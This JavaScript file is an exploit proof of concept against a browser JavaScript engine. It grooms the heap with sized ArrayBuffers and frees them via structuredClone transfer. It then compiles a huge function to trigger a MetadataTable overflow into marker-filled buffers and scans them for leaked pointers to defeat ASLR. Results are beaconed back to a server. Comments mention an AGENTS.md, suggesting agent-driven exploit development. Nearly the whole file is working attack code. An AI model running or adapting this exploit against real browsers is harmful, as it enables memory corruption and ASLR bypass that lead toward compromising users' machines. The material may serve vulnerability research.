// p317b - MetadataTable overflow: bait-and-switch with correct 100112-byte buffers
//
// Fix from p317: spray was wrong size (200KB != MetadataTable's 100112B) and
// wrong position (after free, not before). Proven pattern from AGENTS.md:
// 1. Allocate BAITS (100112B) at lower addresses
// 2. Allocate TARGETS (100112B) at higher addresses, filled with markers
// 3. Free BAITS -> holes at lower addresses
// 4. Compile function -> MetadataTable fills a bait hole
// 5. finishCreation sweeps FORWARD from MetadataTable into TARGETS
// 6. Scan targets for overwritten markers -> thunk pointers -> ASLR leak
//
// MetadataTable alloc = sizeof(LinkingData) + totalSize = 16 + 100096 = 100112
// Per-entry writes at stride 112:
//   +12: m_slowPathCount = 0xFFFFFFFF
//   +24: m_slowPathCallDestination = thunk pointer (ASLR leak)
//   +64: bit fields (m_callType)
//   +68: m_bytecodeIndex = sequential index
//
// Beacon prefix: V317B-

(function() {
  var BQ = 0;
  function B(tag, body) {
    try {
      var u = '/beacon/V317B-' + tag + '?t=' + Date.now() + '&q=' + (BQ++);
      if (body !== undefined && String(body).length < 2000) {
        var x = new XMLHttpRequest();
        x.open('POST', u, true);
        x.send(String(body));
      } else {
        new Image().src = u;
      }
    } catch(e) {
      try { new Image().src = '/beacon/V317B-ERR-' + tag.substring(0,30); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexByte(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT');

  var MT_SIZE = 100112;
  var BAIT_COUNT = 400;
  var TARGET_COUNT = 400;
  var MARKER = 0x42;

  // Phase 1: Allocate BAITS at lower addresses
  var baits = new Array(BAIT_COUNT);
  var baitOK = 0;
  for (var i = 0; i < BAIT_COUNT; i++) {
    try {
      baits[i] = new ArrayBuffer(MT_SIZE);
      baitOK++;
    } catch(e) { break; }
  }
  B('BAITS-' + baitOK);

  // Phase 2: Allocate TARGETS at higher addresses, fill with markers
  var targets = new Array(TARGET_COUNT);
  var tViews = new Array(TARGET_COUNT);
  var targetOK = 0;
  for (var i = 0; i < TARGET_COUNT; i++) {
    try {
      targets[i] = new ArrayBuffer(MT_SIZE);
      tViews[i] = new Uint8Array(targets[i]);
      // Fill entire buffer with marker
      for (var j = 0; j < MT_SIZE; j++) tViews[i][j] = MARKER;
      targetOK++;
    } catch(e) { break; }
  }
  B('TARGETS-' + targetOK);

  // Phase 3: Free ALL baits to create holes at lower addresses
  var freed = 0;
  for (var i = 0; i < BAIT_COUNT; i++) {
    if (!baits[i]) continue;
    try {
      structuredClone(baits[i], {transfer: [baits[i]]});
      freed++;
    } catch(e) {}
    baits[i] = null;
  }
  baits = null;
  B('FREED-' + freed);

  // Phase 4: GC pressure to ensure holes are fully released
  var gcP = [];
  for (var i = 0; i < 80; i++) gcP.push(new ArrayBuffer(65536));
  gcP = null;
  for (var i = 0; i < 40000; i++) var _gc1 = {a: i, b: [i]};

  setTimeout(function() {
    var gcP2 = [];
    for (var i = 0; i < 80; i++) gcP2.push(new ArrayBuffer(65536));
    gcP2 = null;
    for (var i = 0; i < 40000; i++) var _gc2 = {a: i, b: [i]};
    B('GC-DONE');

    // Phase 5: Compile the 38M function -> MetadataTable fills a bait hole
    // finishCreation sweeps FORWARD into target buffers
    var N = 38348816;
    var CHUNK = 4000000;
    var nChunks = Math.floor(N / CHUNK);
    var rem = N - nChunks * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(nChunks + 3);
    parts[0] = 'window.__p317bfn=function(a){';
    for (var c = 0; c < nChunks; c++) parts[1 + c] = callChunk;
    parts[nChunks + 1] = 'a();'.repeat(rem);
    parts[nChunks + 2] = '};window.__p317bScan();';
    callChunk = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    window.__p317bScan = function() {
      B('COMPILED-OK');

      // Phase 6: Scan target buffers for sweep corruption
      var hitBufs = 0;
      var leaks = [];
      var firstHit = -1;
      var totalModified = 0;

      for (var ti = 0; ti < TARGET_COUNT; ti++) {
        var v = tViews[ti];
        if (!v || !v.buffer || v.buffer.byteLength !== MT_SIZE) continue;

        // Check known write offsets at stride 112
        // offset+12: m_slowPathCount (0xFFFFFFFF)
        // offset+24: m_slowPathCallDestination (pointer)
        // offset+68: m_bytecodeIndex (sequential)
        var modified = false;
        for (var off = 12; off + 4 <= MT_SIZE; off += 112) {
          var val = u32(v, off);
          if (val !== 0x42424242) { modified = true; break; }
        }
        if (!modified) {
          // Also check offset+24 (pointer field)
          for (var off = 24; off + 8 <= MT_SIZE; off += 112) {
            var val = u32(v, off);
            if (val !== 0x42424242) { modified = true; break; }
          }
        }
        if (!modified) continue;

        if (firstHit < 0) firstHit = ti;
        hitBufs++;
        totalModified++;

        if (leaks.length >= 8) continue;

        // Extract thunk pointer from m_slowPathCallDestination (offset+24, 8 bytes)
        for (var off = 24; off + 8 <= MT_SIZE; off += 112) {
          var lo = u32(v, off);
          var hi = u32(v, off + 4);
          if (lo !== 0x42424242 || hi !== 0x42424242) {
            var ptr = hex8(v, off);
            if (ptr !== '0000000000000000') {
              leaks.push('T' + ti + '-O' + off + '-P' + ptr);
              // Also get m_slowPathCount (offset+12)
              var spc = u32(v, off - 12);
              if (spc === 0xFFFFFFFF) {
                leaks.push('SPC-CONFIRMED');
              }
              break;
            }
          }
        }
      }

      B('RESULT-hit' + hitBufs + '-leak' + leaks.length + '-first' + firstHit);

      for (var i = 0; i < leaks.length; i++) {
        B('LEAK-' + i + '-' + leaks[i]);
      }

      if (hitBufs === 0) {
        // Diagnostics: check every byte of first few targets
        var intact = 0, zeroed = 0, partial = 0;
        for (var ti = 0; ti < Math.min(50, TARGET_COUNT); ti++) {
          var v = tViews[ti];
          if (!v || !v.buffer) continue;
          var anyChange = false;
          var anyMarker = false;
          for (var j = 0; j < Math.min(MT_SIZE, 1024); j++) {
            if (v[j] !== MARKER) anyChange = true;
            if (v[j] === MARKER) anyMarker = true;
          }
          if (!anyChange) intact++;
          else if (!anyMarker) zeroed++;
          else partial++;
        }
        B('DIAG-I' + intact + '-Z' + zeroed + '-P' + partial);

        // Dump first modified bytes from first non-intact target
        for (var ti = 0; ti < Math.min(50, TARGET_COUNT); ti++) {
          var v = tViews[ti];
          if (!v || !v.buffer) continue;
          for (var j = 0; j < MT_SIZE; j++) {
            if (v[j] !== MARKER) {
              // Dump 64 bytes from this offset
              var dump = '';
              for (var d = 0; d < 64 && j + d < MT_SIZE; d++) {
                dump += hexByte(v[j + d]);
              }
              B('DUMP-T' + ti + '-OFF' + j + '-' + dump);
              ti = TARGET_COUNT; // break outer
              break;
            }
          }
        }
      } else {
        // Dump first hit for analysis
        for (var ti = firstHit; ti <= firstHit && ti < TARGET_COUNT; ti++) {
          var v = tViews[ti];
          if (!v || !v.buffer) continue;
          // Dump first 128 bytes
          var dump = '';
          for (var d = 0; d < 128 && d < MT_SIZE; d++) {
            dump += hexByte(v[d]);
          }
          B('HITDUMP-T' + ti + '-' + dump);
          // Dump bytes at stride-112 offsets (0, 112, 224)
          for (var s = 0; s < 3; s++) {
            var base = s * 112;
            if (base + 112 > MT_SIZE) break;
            var entry = '';
            for (var d = 0; d < 112 && base + d < MT_SIZE; d++) {
              entry += hexByte(v[base + d]);
            }
            B('ENTRY-' + s + '-' + entry);
          }
        }
      }

      B('DONE');
    };

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;

    setTimeout(function() {
      if (!window.__p317bfn) B('TIMEOUT-NO-COMPILE');
    }, 120000);
  }, 2000);
})();
